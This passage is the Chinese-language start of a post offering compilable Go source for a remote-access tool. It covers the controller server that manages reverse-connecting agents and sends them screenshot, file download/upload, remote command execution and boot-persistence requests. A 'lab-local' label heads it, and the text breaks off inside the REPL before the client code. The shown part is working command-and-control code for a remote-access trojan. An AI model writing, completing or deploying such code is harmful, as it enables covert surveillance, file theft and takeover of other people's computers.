[k] Code: 完整远控（服务端 + 客户端，Go，可直接编译）

env: lab-local · targets=own-server + own-host · data=n/a

结构：

```
rcs/
├── go.mod
├── cmd/server/main.go   # 控制端
└── cmd/client/main.go   # agent（反连、截图、文件、cmd、自启）
```

协议：4 字节大端长度 + JSON 帧，二进制走 base64 放 `data`，单帧上限 64MB。所有请求/响应带 `id` 配对。

---

## Part 1 · 服务端 `cmd/server/main.go`

```go
package main

import (
	"bufio"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

const maxFrame = 64 << 20
const chunkSize = 32 * 1024

type Msg struct {
	ID   string `json:"id,omitempty"`
	Type string `json:"type"`
	Name string `json:"name,omitempty"`
	Path string `json:"path,omitempty"`
	Data string `json:"data,omitempty"`
	Size int64  `json:"size,omitempty"`
	Last bool   `json:"last,omitempty"`
	Code int    `json:"code,omitempty"`
	Text string `json:"text,omitempty"`
}

// ---------- 帧编解码 ----------
func readMsg(r io.Reader) (Msg, error) {
	var hdr [4]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return Msg{}, err
	}
	n := binary.BigEndian.Uint32(hdr[:])
	if n == 0 || n > maxFrame {
		return Msg{}, errors.New("bad frame size")
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(r, buf); err != nil {
		return Msg{}, err
	}
	var m Msg
	return m, json.Unmarshal(buf, &m)
}

func writeMsg(w io.Writer, m Msg) error {
	b, err := json.Marshal(m)
	if err != nil {
		return err
	}
	var hdr [4]byte
	binary.BigEndian.PutUint32(hdr[:], uint32(len(b)))
	if _, err := w.Write(hdr[:]); err != nil {
		return err
	}
	_, err = w.Write(b)
	return err
}

// ---------- 会话 ----------
type Session struct {
	id     int
	conn   net.Conn
	in     chan Msg
	wmu    sync.Mutex
	info   string
	dead   chan struct{}
	closed bool
}

var (
	seq       int64
	seqMu     sync.Mutex
	sessions  = map[int]*Session{}
	sessMu    sync.Mutex
	current   *Session
)

func nid() string {
	seqMu.Lock()
	defer seqMu.Unlock()
	seq++
	return strconv.FormatInt(seq, 10)
}

func newSession(id int, c net.Conn) *Session {
	s := &Session{id: id, conn: c, in: make(chan Msg, 512), dead: make(chan struct{})}
	go func() {
		defer close(s.dead)
		for {
			m, err := readMsg(c)
			if err != nil {
				return
			}
			if m.Type == "INFO" && s.info == "" {
				s.info = m.Text
				continue
			}
			s.in <- m
		}
	}()
	return s
}

func (s *Session) send(m Msg) error {
	s.wmu.Lock()
	defer s.wmu.Unlock()
	s.conn.SetWriteDeadline(time.Now().Add(120 * time.Second))
	return writeMsg(s.conn, m)
}

// 取一条与 id 匹配的响应；单飞 REPL，非匹配帧丢弃
func (s *Session) wait(id string, timeout time.Duration) (Msg, error) {
	t := time.NewTimer(timeout)
	defer t.Stop()
	for {
		select {
		case m := <-s.in:
			if m.ID == id {
				return m, nil
			}
		case <-t.C:
			return Msg{}, errors.New("timeout waiting response")
		case <-s.dead:
			return Msg{}, errors.New("session closed")
		}
	}
}

func (s *Session) request(m Msg, timeout time.Duration) (Msg, error) {
	m.ID = nid()
	if err := s.send(m); err != nil {
		return Msg{}, err
	}
	return s.wait(m.ID, timeout)
}

func (s *Session) alive() bool {
	select {
	case <-s.dead:
		return false
	default:
		return true
	}
}

// ---------- 传输动作 ----------
func doShot(s *Session, local string) error {
	m, err := s.request(Msg{Type: "SHOT"}, 60*time.Second)
	if err != nil {
		return err
	}
	if m.Code != 0 {
		return errors.New(m.Text)
	}
	raw, err := base64.StdEncoding.DecodeString(m.Data)
	if err != nil {
		return err
	}
	if local == "" {
		local = fmt.Sprintf("shot_%d_%d.jpg", s.id, time.Now().Unix())
	}
	if err := os.WriteFile(local, raw, 0644); err != nil {
		return err
	}
	fmt.Printf("[+] saved %s (%d bytes)\n", local, len(raw))
	return nil
}

func doGet(s *Session, remote, local string) error {
	if local == "" {
		local = filepath.Base(remote)
	}
	m, err := s.request(Msg{Type: "GET", Path: remote}, 60*time.Second)
	if err != nil {
		return err
	}
	if m.Code != 0 {
		return errors.New(m.Text)
	}
	f, err := os.Create(local)
	if err != nil {
		return err
	}
	defer f.Close()
	remaining := m.Size
	got := int64(0)
	for remaining > 0 {
		ch, err := s.wait(m.ID, 120*time.Second)
		if err != nil {
			return err
		}
		if ch.Code != 0 {
			return errors.New(ch.Text)
		}
		if ch.Type != "CHUNK" {
			continue
		}
		data, err := base64.StdEncoding.DecodeString(ch.Data)
		if err != nil {
			return err
		}
		if _, err := f.Write(data); err != nil {
			return err
		}
		got += int64(len(data))
		remaining -= int64(len(data))
		if ch.Last {
			break
		}
	}
	fmt.Printf("[+] got %s -> %s (%d bytes)\n", remote, local, got)
	return nil
}

func doPut(s *Session, local, remote string) error {
	data, err := os.ReadFile(local)
	if err != nil {
		return err
	}
	id := nid()
	if err := s.send(Msg{ID: id, Type: "PUT_START", Path: remote, Size: int64(len(data))}); err != nil {
		return err
	}
	ack, err := s.wait(id, 60*time.Second)
	if err != nil {
		return err
	}
	if ack.Code != 0 {
		return errors.New(ack.Text)
	}
	for off := 0; off < len(data); off += chunkSize {
		end := off + chunkSize
		if end > len(data) {
			end = len(data)
		}
		if err := s.send(Msg{ID: id, Type: "PUT_CHUNK",
			Data: base64.StdEncoding.EncodeToString(data[off:end])}); err != nil {
			return err
		}
	}
	if err := s.send(Msg{ID: id, Type: "PUT_END"}); err != nil {
		return err
	}
	ack, err = s.wait(id, 120*time.Second)
	if err != nil {
		return err
	}
	if ack.Code != 0 {
		return errors.New(ack.Text)
	}
	fmt.Printf("[+] put %s -> %s (%d bytes)\n", local, remote, len(data))
	return nil
}

func doExec(s *Session, cmdline string) error {
	m, err := s.request(Msg{Type: "EXEC", Text: cmdline}, 120*time.Second)
	if err != nil {
		return err
	}
	fmt.Println("---- exit:", m.Code, "----")
	fmt.Println(m.Text)
	return nil
}

func doPersist(s *Session) error {
	m, err := s.request(Msg{Type: "PERSIST"}, 60*time.Second)
	if err != nil {
		return err
	}
	fmt.Println("---- persist exit:", m.Code, "----")
	fmt.Println(m.Text)
	return nil
}

func doLS(s *Session, path string) error {
	m, err := s.request(Msg{Type: "LS", Path: path}, 30*time.Second)
	if err != nil {
		return err
	}
	if m.Code != 0 {
		return errors.New(m.Text)
	}
	fmt.Println(m.Text)
	return nil
}

// ---------- REPL ----------
func needSession() (*Session, error) {
	if current == nil {
		return nil, errors.New("no session selected, run: use <id>")
	}
	if !current.alive() {
		return nil, errors.New("session dead, run: list")
	}
	return current, nil
}

func pruneDead() {
	sessMu.Lock()
	defer sessMu.Unlock()
	for id, s := range sessions {
		if !s.alive() {
			delete(sessions, id)
			if current == s {
				current = nil
			}
			log.Printf("[-] agent #%d dropped", id)
		}
	}
}

func repl() {
	sc := bufio.NewScanner(os.Stdin)
	fmt.Println(`commands:
  list                 会话列表
  use <id>             切换会话
  shot [local.jpg]     截当前屏
  ls <path>            远程列目录
  get <remote> [l]     下载
  put <local> <remote> 上传
  exec <cmdline>       远程执行
  persist              安装开机自启
  close                断开当前会话
  exit`)
	for {
		fmt.Print("rcs> ")
		if !sc.Scan() {
			return
		}
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) == 2 {
			arg = parts[1]
		}
		var err error
		switch cmd {
		case "list":
			pruneDead()
			sessMu.Lock()
			if len(sessions) == 0 {
				fmt.Println("(no agents)")
			}
			for id, s := range sessions {
				mark := " "
				if current == s {
					mark = "*"
				}
				info := s.info
				if info == "" {
					info = "(handshake)"
				}
				fmt.Printf(" %s #%-3d %-22s %s\n", mark, id, s.conn.RemoteAddr(), info)
			}
			sessMu.Unlock()
		case "use":
			sessMu.Lock()
			id, e := strconv.Atoi(strings.TrimPrefix(arg, "#"))
			if e != nil {
				err = errors.New("usage: use <id>")
			} else if s, ok := sessions[id]; ok && s.alive() {
				current = s
				fmt.Println("[+] switched to agent #", id)
			} else {
				err = errors.New("no such live session")
			}
